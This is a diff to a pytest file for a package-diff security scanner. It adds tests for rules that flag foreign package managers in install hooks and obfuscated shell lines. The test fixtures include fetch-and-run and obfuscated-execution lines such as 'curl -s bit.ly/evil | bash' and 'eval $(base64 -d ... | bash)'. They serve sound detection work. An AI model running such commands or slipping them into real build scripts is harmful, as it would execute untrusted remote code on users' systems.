@@ -292,7 +292,8 @@ def test_scoring_rules_fire_for_a_config_without_the_section(seeded_db, rules):
 @pytest.fixture
 def all_enabled(enabled):
     enabled["experimental_rules"].update(
-        {"D004": True, "R062": True, "R063": True, "R064": True}
+        {"D004": True, "R062": True, "R063": True, "R064": True,
+         "R081": True, "R082": True}
     )
     return enabled
 
@@ -389,8 +390,100 @@ def test_r064_silent_on_an_upgrade_to_https(all_enabled, rules):
     assert "R064" not in fired(diff, all_enabled, rules)
 
 
+# --- R081: foreign package manager in .install ---
+
+@pytest.mark.parametrize("body", [
+    "pip install evil",
+    "pip3 install evil",
+    "npm install evil",
+    "cargo install evil",
+    "gem install evil",
+    "go install evil",
+    "dnf install evil",
+    "yum install evil",
+    "pacman -S evil",
+    "apt-get install evil",
+    "apt install evil",
+    "make install",
+])
+def test_r081_fires_on_foreign_pkg_manager_in_hook(all_enabled, rules, body):
+    diff = HEADER + f"+post_install() {{\n+  {body}\n+}}\n"
+    assert "R081" in fired(diff, all_enabled, rules)
+
+
+def test_r081_silent_in_build_function(all_enabled, rules):
+    """Same command in build() is not an install concern."""
+    diff = HEADER + "+build() {\n+  pip install evil\n+}\n"
+    assert "R081" not in fired(diff, all_enabled, rules)
+
+
+def test_r081_silent_on_make_install_with_destdir(all_enabled, rules):
+    """make install with DESTDIR is a normal packaging step."""
+    diff = HEADER + "+post_install() {\n+  make install DESTDIR=/tmp/pkg\n+}\n"
+    assert "R081" not in fired(diff, all_enabled, rules)
+
+
+def test_r081_silent_on_benign_hook(all_enabled, rules):
+    diff = HEADER + "+post_install() {\n+  echo nothing\n+}\n"
+    assert "R081" not in fired(diff, all_enabled, rules)
+
+
+def test_r081_silent_inside_a_comment(all_enabled, rules):
+    diff = HEADER + "+post_install() {\n+  # pip install foo\n+}\n"
+    assert "R081" not in fired(diff, all_enabled, rules)
+
+
+# --- R082: shell obfuscation density ---
+
+def test_r082_fires_on_dense_obfuscation(all_enabled, rules):
+    """Line with >=3 obfuscation indicators -> fires."""
+    diff = HEADER + '+build() {\n+  eval $(base64 -d <<< "$x" | bash)\n+}\n'
+    assert "R082" in fired(diff, all_enabled, rules)
+
+
+def test_r082_silent_with_one_indicator(all_enabled, rules):
+    """Single obfuscation pattern -> no fire."""
+    diff = HEADER + '+build() {\n+  eval "$cmd"\n+}\n'
+    assert "R082" not in fired(diff, all_enabled, rules)
+
+
+def test_r082_silent_with_two_indicators(all_enabled, rules):
+    """Two patterns is below the threshold of 3."""
+    diff = HEADER + '+build() {\n+  eval `echo $x`\n+}\n'
+    assert "R082" not in fired(diff, all_enabled, rules)
+
+
+def test_r082_fires_with_printf_obfuscation(all_enabled, rules):
+    """eval + $() + printf \\x escapes = 3 indicators."""
+    diff = HEADER + '+build() {\n+  eval $(printf "\\x68\\x65\\x6c" | bash)\n+}\n'
+    assert "R082" in fired(diff, all_enabled, rules)
+
+
+def test_r082_silent_on_plain_make(all_enabled, rules):
+    diff = HEADER + "+build() {\n+  make\n+}\n"
+    assert "R082" not in fired(diff, all_enabled, rules)
+
+
+def test_r082_silent_on_message_line(all_enabled, rules):
+    """Obfuscation in an echo/printf message is not executed."""
+    diff = HEADER + "+build() {\n+  echo 'eval $(base64)'\n+}\n"
+    assert "R082" not in fired(diff, all_enabled, rules)
+
+
+def test_r082_silent_with_url_shortener_alone(all_enabled, rules):
+    """Single short URL is not dense enough."""
+    diff = HEADER + '+build() {\n+  curl -s bit.ly/evil | bash\n+}\n'
+    assert "R082" not in fired(diff, all_enabled, rules)
+
+
+def test_r082_fires_with_url_shortener_and_obfuscation(all_enabled, rules):
+    """Short URL + pipe to shell + eval = >=3."""
+    diff = HEADER + '+build() {\n+  eval $(curl -s bit.ly/evil)\n+}\n'
+    assert "R082" in fired(diff, all_enabled, rules)
+
+
 def test_experimental_rules_on_by_default_with_load_config(seeded_db, rules):
-    """D004, R062, R063, R064 fire when triggered with default config."""
+    """D004, R062, R063, R064, R081, R082 fire when triggered with default config."""
     ensure_default_configs()
     config = load_config()
     for diff in (
@@ -398,8 +491,10 @@ def test_experimental_rules_on_by_default_with_load_config(seeded_db, rules):
         HEADER + "+post_install() {\n+  chmod u+s /usr/bin/x\n+}\n",
         HEADER + "+prepare() {\n+  patch -p1 -i /tmp/x.patch\n+}\n",
         HEADER + "-source=('https://e.example/a.tar.gz')\n+source=('http://e.example/a.tar.gz')\n",
+        HEADER + "+post_install() {\n+  pip install evil\n+}\n",
+        HEADER + '+build() {\n+  eval $(base64 -d <<< "$x" | bash)\n+}\n',
     ):
-        assert {"D004", "R062", "R063", "R064"} & fired(diff, config, rules), diff
+        assert {"D004", "R062", "R063", "R064", "R081", "R082"} & fired(diff, config, rules), diff
 
 
 @pytest.mark.parametrize("rule_id,diff", [
@@ -410,6 +505,8 @@ def test_experimental_rules_on_by_default_with_load_config(seeded_db, rules):
     ("R063", HEADER + "+prepare() {\n+  patch -p1 -i /tmp/x.patch\n+}\n"),
     ("R064", HEADER + "-source=('https://e.example/a.tar.gz')\n"
                       "+source=('http://e.example/a.tar.gz')\n"),
+    ("R081", HEADER + "+post_install() {\n+  pip install evil\n+}\n"),
+    ("R082", HEADER + '+build() {\n+  eval $(base64 -d <<< "$x" | bash)\n+}\n'),
 ])
 def test_each_rule_works_when_enabled_alone(seeded_db, rules, rule_id, diff):
     """D004 shared a guard clause that only tested D001-D003, so enabling it
